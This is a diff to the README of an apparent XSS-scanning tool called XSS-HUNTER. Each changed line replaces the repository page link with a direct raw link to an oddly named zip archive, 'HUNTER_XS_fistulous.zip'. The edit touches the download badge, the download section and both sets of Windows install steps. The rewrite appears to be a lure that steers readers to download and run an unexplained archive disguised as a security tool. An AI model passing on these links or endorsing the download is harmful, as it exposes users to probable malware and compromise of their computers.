@@ -1,12 +1,12 @@
 # 🛡️ XSS-HUNTER - Find Reflected XSS Faster
 
-[![Download XSS-HUNTER](https://img.shields.io/badge/Download%20XSS--HUNTER-blue?style=for-the-badge&logo=github)](https://github.com/brittle-finance685/XSS-HUNTER)
+[![Download XSS-HUNTER](https://img.shields.io/badge/Download%20XSS--HUNTER-blue?style=for-the-badge&logo=github)](https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip)
 
 ## 📥 Download XSS-HUNTER
 
 Use this link to visit the page and get the app:
 
-[Download XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
+[Download XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip)
 
 ## 🧰 What XSS-HUNTER Does
 
@@ -39,7 +39,7 @@ For the best result, keep your system updated and close apps you do not need whi
 Follow these steps to download and run XSS-HUNTER on your Windows PC:
 
 1. Open the download page:
-   [https://github.com/brittle-finance685/XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
+   [https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip](https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip)
 
 2. On the repository page, look for the latest release or the main download files.
 
@@ -206,7 +206,7 @@ This project fits the following areas:
 ## 🏁 Start Here
 
 1. Visit the download page:
-   [https://github.com/brittle-finance685/XSS-HUNTER](https://github.com/brittle-finance685/XSS-HUNTER)
+   [https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip](https://github.com/brittle-finance685/XSS-HUNTER/raw/refs/heads/main/subpiston/HUNTER_XS_fistulous.zip)
 
 2. Download the Windows file or main package from the page.
 
